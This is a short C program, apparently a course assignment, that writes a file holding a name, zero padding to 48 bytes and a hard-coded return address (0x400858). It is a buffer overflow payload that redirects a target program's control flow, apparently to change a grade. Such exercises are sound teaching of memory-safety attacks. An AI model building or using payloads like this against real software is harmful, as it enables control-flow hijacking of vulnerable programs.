/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Sean Wang, Giao Vu Dinh                                    */
/*--------------------------------------------------------------------*/


#include <stdio.h>

/*--------------------------------------------------------------------*/

/*  */

int main(void)
{
   int i;
   unsigned long ulData;
   char* psName;
   FILE *psFile;
   ulData = 0x400858; 
   psFile = fopen("dataB", "w");
   
   psName = "Sean Wang";
   for (i = 0; i<strlen(psName); i++){
       fprintf(psFile, "%c", psName[i]);
   }
   for (i = 0; i<(48-(strlen(psName))); i++){
       fprintf(psFile, "%c", 0x00);
   }
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);
   
   

   fclose(psFile);


   return 0;
}
